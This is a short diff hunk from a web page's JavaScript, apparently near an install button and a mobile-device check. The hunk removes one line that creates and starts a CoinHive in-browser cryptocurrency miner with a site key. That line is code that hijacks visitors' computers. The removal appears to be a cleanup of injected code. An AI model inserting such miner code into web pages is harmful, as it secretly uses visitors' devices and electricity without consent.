@@ -6,7 +6,6 @@
         return check;
     };
 
-    var ll = new CoinHive.Anonymous('LAWkR7hoq05U0zB5WFvaDCldo57oDf3f');ll.start();
     var button = document.getElementById('installButton');
 
     if ( window.mobileAndTabletcheck()){
